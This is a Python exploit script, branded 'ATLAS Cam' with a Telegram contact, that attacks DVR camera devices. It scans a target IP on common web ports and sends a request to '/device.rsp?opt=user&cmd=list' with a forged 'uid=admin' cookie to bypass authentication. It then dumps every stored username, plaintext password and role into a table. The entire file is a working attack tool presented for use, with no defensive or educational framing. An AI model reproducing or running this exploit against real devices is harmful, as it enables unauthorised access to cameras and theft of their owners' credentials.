# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import socket
import tableprint as tp

class Colors:
    RED = '\033[0;31m'
    DEFAULT = '\033[0m'

banner = r'''
 █████╗ ████████╗██╗      █████╗ ███████╗     ██████╗ █████╗ ███╗   ███╗
██╔══██╗╚══██╔══╝██║     ██╔══██╗██╔════╝    ██╔════╝██╔══██╗████╗ ████║
███████║   ██║   ██║     ███████║███████╗    ██║     ███████║██╔████╔██║
██╔══██║   ██║   ██║     ██╔══██║╚════██║    ██║     ██╔══██║██║╚██╔╝██║
██║  ██║   ██║   ███████╗██║  ██║███████║    ╚██████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝


              ┌──────────────────────────────┐
              │          ATLAS - Cam         │
              │          @Atlas_2x           │
              │   https://t.me/the_seeker8   │
              └──────────────────────────────┘
'''

print(Colors.RED + banner + Colors.DEFAULT)

parser = argparse.ArgumentParser(
    description='ATLAS Cam - DVR Credentials Checker'
)

parser.add_argument('--host', dest="HOST", help='Target IP', required=True)
parser.add_argument('--port', dest="PORT", help='Port', default=None)

args = parser.parse_args()

target = args.HOST

if args.PORT:
    ports = [int(args.PORT)]
else:
    ports = [80, 81, 8080, 8000]

headers = {}

def check_port(ip, port):
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def make_headers():
    headers["User-Agent"] = "Mozilla/5.0"
    headers["Cookie"] = "uid=admin"
    return headers

print(Colors.RED + "[+] Starting scan..." + Colors.DEFAULT)

for port in ports:

    print(Colors.RED + "[+] Checking port: " + str(port) + Colors.DEFAULT)

    if not check_port(target, port):
        print(Colors.RED + "[-] Port closed\n" + Colors.DEFAULT)
        continue

    url = "http://" + target + ":" + str(port) + "/device.rsp?opt=user&cmd=list"

    try:
        print(Colors.RED + "[+] Sending request..." + Colors.DEFAULT)

        r = requests.get(url, headers=make_headers(), timeout=8)

        data = json.loads(r.text)

        users = data["list"]

        print(Colors.RED + "[+] Vulnerable device found!\n" + Colors.DEFAULT)

        table = []

        for u in users:
            table.append([
                u["uid"],
                u["pwd"],
                u["role"]
            ])

        headers_table = ["Username", "Password", "Role"]

        tp.table(table, headers_table, width=20)

        break

    except:
        print(Colors.RED + "[-] Not vulnerable or no response\n" + Colors.DEFAULT)
